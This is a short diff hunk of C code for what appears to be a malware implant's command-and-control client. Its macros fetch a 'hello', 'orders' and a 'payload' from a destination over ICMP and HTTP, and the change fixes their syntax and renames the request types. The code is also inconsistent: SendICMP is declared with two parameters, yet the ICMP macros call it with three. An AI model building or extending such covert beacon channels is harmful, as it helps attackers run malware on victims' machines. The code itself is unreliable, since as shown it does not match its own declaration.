@@ -5,16 +5,16 @@
 // ICMP
 INT SendICMP(LPSTR destination, REQUEST_TYPE request_type);
 
-#define SendICMP_GetHello(destination) SendICMP(LPSTR destination, 32, HELLO);
-#define SendICMP_GetOrders(destination) SendICMP(LPSTR destination, 32, GET_INFORMATION);
-#define SendICMP_GetPayload(destination) SendICMP(LPSTR destination, 200, GET_PAYLOAD);
+#define SendICMP_GetHello(destination) SendICMP(destination, 32, GET_HELLO);
+#define SendICMP_GetOrders(destination) SendICMP(destination, 32, GET_INSTRUCTION);
+#define SendICMP_GetPayload(destination) SendICMP(destination, 200, GET_PAYLOAD);
 
 // HTTP
 INT SendHTTP(LPSTR destination, REQUEST_TYPE request_type);
 
-#define SendHTTP_GetHello(destination) SendHTTP(LPSTR destination, HELLO);
-#define SendHTTP_GetOrders(destination) SendHTTP(LPSTR destination, GET_INFORMATION);
-#define SendHTTP_GetPayload(destination) SendHTTP(LPSTR destination, GET_PAYLOAD);
+#define SendHTTP_GetHello(destination) SendHTTP(destination, GET_HELLO);
+#define SendHTTP_GetOrders(destination) SendHTTP(destination, GET_INSTRUCTION);
+#define SendHTTP_GetPayload(destination) SendHTTP(destination, GET_PAYLOAD);
 
 
 INT main(VOID) {
